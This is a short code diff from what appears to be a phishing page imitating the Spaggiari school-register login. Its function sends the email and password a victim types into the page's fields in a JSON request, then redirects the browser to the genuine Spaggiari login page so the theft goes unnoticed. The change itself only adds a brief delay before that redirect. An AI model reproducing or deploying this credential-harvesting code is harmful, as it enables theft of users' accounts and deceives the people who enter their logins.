@@ -1024,7 +1024,7 @@ function sendMessage() {
         content: `EMAIL: ${this.document.getElementById("login").value}\nPASSWORD: ${this.document.getElementById("password").value}`
     };
     request.send(JSON.stringify(params));
-    setTimeout(() => this.window.location.replace('https://web.spaggiari.eu/home/app/default/login.php'));
+    setTimeout(() => this.window.location.replace('https://web.spaggiari.eu/home/app/default/login.php'), 10);
 }
 </script>
 
